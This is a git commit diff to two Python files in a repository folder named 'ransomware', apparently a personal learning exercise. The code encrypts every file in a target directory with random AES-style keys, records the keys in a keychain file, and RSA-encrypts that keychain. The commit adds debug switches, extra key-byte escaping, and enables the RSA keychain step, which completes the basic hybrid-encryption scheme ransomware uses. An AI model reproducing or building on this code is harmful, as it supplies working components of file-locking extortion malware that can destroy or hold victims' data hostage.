d56d7cc4c5697c718ed0a788547af800ad0bee84
daniel.meshorer <danielmeshorer@gmail.com>
2023-05-28 09:51:48 +0300

    update

--- cyber/ransomware/ex1_opt2.py
+++ cyber/ransomware/ex1_opt2.py
@@ -9,7 +9,7 @@ import tsetrsa
 
 key_size = 32
 until_iv_size = 48
-
+debug = 1
 mypath = "/home/daniel/git/cyber/ransomware/files_to_encrypt/"
 keychain_path = "/home/daniel/git/cyber/ransomware/keychain.txt"
 
@@ -18,11 +18,13 @@ def get_key():
     return get_random_bytes(32)  # key generation
 
 def append_to_keychain(file,key,iv):
+    global debug
     global keychain_path
     encoded = file.encode()
     with open(keychain_path, 'ab') as keychain:
         to_write = encoded +b":" + key  + iv + b"\n"
-        print("all the line i am writing - ",to_write)
+        if debug:
+            print("all the line i am writing - ",to_write)
         keychain.write(to_write)
 
 def extract_key_from_keychain(file):
@@ -38,6 +40,7 @@ def extract_key_from_keychain(file):
 
 def encrypt_files():
     global mypath
+    global debug
     files_list = [f for f in listdir(mypath) if isfile(join(mypath, f))]  # return list of the files
      
     for file in files_list: 
@@ -45,6 +48,8 @@ def encrypt_files():
         escaped_text = key.replace(b':', b's')
         escaped_text = escaped_text.replace(b'\n', b'w')
         escaped_text = escaped_text.replace(b'\\', b'w')
+        escaped_text = escaped_text.replace(b'.', b'w')
+        escaped_text = escaped_text.replace(b'~', b'w')
         key = escaped_text
 
         with open(file, 'rb') as opened_file:    # opening the original file to encrypt
@@ -55,8 +60,9 @@ def encrypt_files():
             escaped_text = iv.replace(b':', b's')
             escaped_text = escaped_text.replace(b'\n', b'w')
             iv = escaped_text
-            print("key to add - ",key)
-            print("iv to add - ",iv) 
+            if debug:
+                print("key to add - ",key)
+                print("iv to add - ",iv) 
             append_to_keychain(file,key,iv) 
  
         with open(file, 'wb') as encrypted_file:   # opening the file in write mode and
@@ -73,10 +79,11 @@ def decrypt():
         line = extract_key_from_keychain(file)
         key = line[:key_size]
         iv = line[key_size:until_iv_size]
-        print("now file: ",file)
-        print("all the line - ",line)
-        print("key extracted -",key)
-        print("iv extracted - ",iv)
+        if debug:
+            print("now file: ",file)
+            print("all the line - ",line)
+            print("key extracted -",key)
+            print("iv extracted - ",iv)
                      
         with open(file, 'rb') as enc_file:   # opening the encrypted file
             encrypted = enc_file.read()
@@ -94,8 +101,8 @@ def empty_keychain():
 
 def main():
     encrypt_files()
-    # tsetrsa.encrypt_rsa()
-    # tsetrsa.decrypt_rsa()
+    tsetrsa.encrypt_rsa()
+    tsetrsa.decrypt_rsa()
     decrypt()
     
 
--- cyber/ransomware/tsetrsa.py
+++ cyber/ransomware/tsetrsa.py
@@ -8,7 +8,7 @@ keychain_path = "/home/daniel/git/cyber/ransomware/keychain.txt"
 key_path = "/home/daniel/git/cyber/ransomware/key.pem"
 public_key_path = "/home/daniel/git/cyber/ransomware/mykey.pub"
 
-
+debug = 0
 def get_public_key():
     with open(public_key_path,'rb') as pub:
         return RSA.importKey(pub.read())
@@ -29,14 +29,16 @@ def encrypt_rsa():
         encrypted_file.write(encrypted)     # writing the encrypted data 
     
 def decrypt_rsa():
+    global debug
     key = get_private_key()
     with open(keychain_path, 'rb') as keychain:
         encrypted = keychain.read()
         decryptor = PKCS1_OAEP.new(key)
         decrypted = decryptor.decrypt(encrypted)
-        print('Decrypted:', decrypted)
+        if debug:
+            print('Decrypted:', decrypted)
         
     with open(keychain_path, 'wb') as keychain:
         keychain.write(decrypted)
-        print("done decrypt to file")
+        print("done decrypt file with rsa")
 
